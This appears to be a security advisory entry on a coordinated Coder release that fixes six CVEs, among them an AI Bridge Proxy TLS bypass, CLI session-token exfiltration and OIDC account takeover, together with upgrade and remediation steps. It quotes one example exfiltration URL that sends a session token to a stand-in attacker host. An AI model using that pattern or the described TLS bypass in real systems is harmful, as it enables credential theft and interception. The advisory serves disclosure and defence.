---
id: 2026-07-coder-ai-bridge-oidc-security-release
title: "Coder — coordinated security release: AI Bridge Proxy TLS bypass, CLI session-token exfil, and two OIDC account-takeover CVEs"
date_disclosed: 2026-07-06
last_updated: 2026-07-08
severity: high
status: patched
ecosystems: [go, oidc, ai-agents]
tools_affected: [coder, coder-cli, coder-ai-bridge]
tags: [cve, oidc, account-takeover, tls, credential-theft, dev-environment, ai-agents]
---

## TL;DR

**Coder** — a self-hosted cloud development-environment platform whose **AI Bridge** component proxies AI-agent traffic (Claude Code, Cursor, and other coding assistants) to upstream LLM providers on behalf of a team — shipped a coordinated security release on **2026-07-06/07** fixing at least **six CVEs** in **v2.34.2** (with backports to 2.33.8, 2.32.7, 2.29.17). The most serious: a default TLS-verification bypass in the AI Bridge Proxy (CVE-2026-55436), a CLI command that can be tricked into exfiltrating a user's live session token to an attacker-controlled server (CVE-2026-55431), and two distinct OIDC login flaws that chain into full account takeover (CVE-2026-55075, CVE-2026-55076). Upgrade to **Coder ≥ 2.34.2** (or the matching backport for your minor version).

## What happened

Coder provisions and manages remote development environments (workspaces) for teams, and its **AI Bridge** feature sits between developers' AI coding agents and upstream LLM providers, holding provider API keys and mediating requests on the team's behalf — the same "central credentials cache" shape this repo has flagged for LiteLLM, Flowise, Langflow, and n8n. A coordinated release disclosed six CVEs together:

- **CVE-2026-55436** (AI Bridge Proxy TLS bypass) — `aibridgeproxyd`'s default transport set `InsecureSkipVerify: true` and only switched to a verifying transport when an upstream proxy was explicitly configured. In the default configuration (no upstream proxy), outbound HTTPS from the AI Bridge Proxy to the Coder access URL accepted **any** TLS certificate, opening a man-in-the-middle window for anyone on-path between the proxy and the Coder server. CVSS vector `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`.
- **CVE-2026-55434** (AI Bridge provider DoS) — AI Bridge provider-handler endpoints read request bodies via unbounded `io.ReadAll`, allowing memory-exhaustion denial of service.
- **CVE-2026-55431** (CLI session-token exfiltration) — `coder open app` performs literal string substitution of `$SESSION_TOKEN` into a workspace-defined external-app URL before handing it to the OS, with no scheme or destination validation. A malicious Terraform workspace template (something a developer might pull from an untrusted template registry, or that a compromised teammate commits) can define an external app pointing at attacker infrastructure (e.g. `https://attacker.example/collect?t=$SESSION_TOKEN`); running `coder open app` against that workspace sends the victim's live session token to the attacker, yielding full account access. Fixed in v2.34.2, with backports to 2.33.8/2.32.7/2.29.17.
- **CVE-2026-55428** — Tailnet coordinator route hijacking.
- **CVE-2026-55075** (OIDC account takeover, email-based matching) — Coder's OIDC login falls back to linking accounts by email address without confirming the identity provider actually verified that email, letting an attacker who controls an unverified-email IdP account take over a victim's Coder account.
- **CVE-2026-55076** (OIDC `email_verified` type-coercion bypass) — Coder checks the `email_verified` OIDC claim with a direct Go boolean type assertion; an identity provider that returns a non-boolean value for that claim (e.g. a string) silently skips the check entirely, again enabling unverified-email account takeover. This chains with CVE-2026-55075.

The two OIDC bugs and the CLI token-exfiltration bug were disclosed **2026-07-06**, alongside CVE-2026-55436, CVE-2026-55434, and CVE-2026-55428, which the vendor bundled into the same v2.34.2 release.

## Am I affected?

```bash
# Check your Coder version
coder version
```

You are affected if you self-host Coder **< 2.34.2** (or the matching backport for 2.33.x/2.32.x/2.29.x) and:
- Use OIDC login with an identity provider whose email-verification behavior you haven't independently confirmed (CVE-2026-55075, CVE-2026-55076), or
- Allow developers to open workspaces built from templates you don't fully control, including third-party/community Terraform templates (CVE-2026-55431), or
- Run the AI Bridge Proxy without an upstream proxy configured, on a network where an on-path attacker is plausible (CVE-2026-55436).

## If you are affected

1. **Upgrade to Coder ≥ 2.34.2** (or your branch's matching backport) immediately.
2. **If you use OIDC login, audit for accounts created/linked via unverified email** before the patch — an attacker may have already claimed an account using CVE-2026-55075 or CVE-2026-55076.
3. **Rotate session tokens** for any user who opened an external app from an untrusted or third-party workspace template prior to patching CVE-2026-55431.
4. **Rotate every upstream LLM provider key brokered through AI Bridge** if your deployment was reachable by an on-path attacker without an upstream proxy configured (CVE-2026-55436) — treat this the same as any other credential-hub compromise.
5. See [playbooks/rotating-cloud-credentials.md](../playbooks/rotating-cloud-credentials.md).

## Prevention

- **Treat any AI-agent traffic broker (LiteLLM, Flowise, Langflow, n8n, Coder AI Bridge, and similar) as a central credentials cache** — a single flaw in the broker is the union of every downstream provider key it holds. Restrict who can reach the broker and rotate its keys on a defined schedule.
- **Don't trust workspace/Terraform templates from outside your org** without review — a template is effectively code that runs with the developer's own tooling context, including CLI token substitution as shown here.
- Always configure an explicit upstream proxy (or otherwise verify TLS is enforced) for any component that proxies HTTPS traffic on your behalf; don't assume "self-hosted" implies "TLS-verified by default."
- → [prevention/credential-hygiene.md](../prevention/credential-hygiene.md), [prevention/ci-cd-hardening.md](../prevention/ci-cd-hardening.md)

## Sources

- [GitLab Advisory Database — CVE-2026-55436](https://advisories.gitlab.com/golang/github.com/coder/coder/v2/CVE-2026-55436/) — AI Bridge Proxy TLS-verification bypass; affected/fixed versions, CVSS vector.
- [GitLab Advisory Database — CVE-2026-55434](https://advisories.gitlab.com/golang/github.com/coder/coder/v2/CVE-2026-55434/) — AI Bridge provider unbounded-read DoS.
- [GitLab Advisory Database — CVE-2026-55075](https://advisories.gitlab.com/golang/github.com/coder/coder/v2/CVE-2026-55075/) — OIDC email-based account-takeover.
- [GitLab Advisory Database — CVE-2026-55076](https://advisories.gitlab.com/golang/github.com/coder/coder/v2/CVE-2026-55076/) — OIDC `email_verified` type-coercion bypass.
- [SecureLayer7 Labs — CVE-2026-55431: Coder CLI Session Token Exfiltration via External App URLs](https://securelayer7.net/lab/cve-2026-55431-coder-cli-session-token-exfiltration-external-app) — independent research writeup; exploitation scenario, affected/patched versions, disclosure date 2026-07-06.
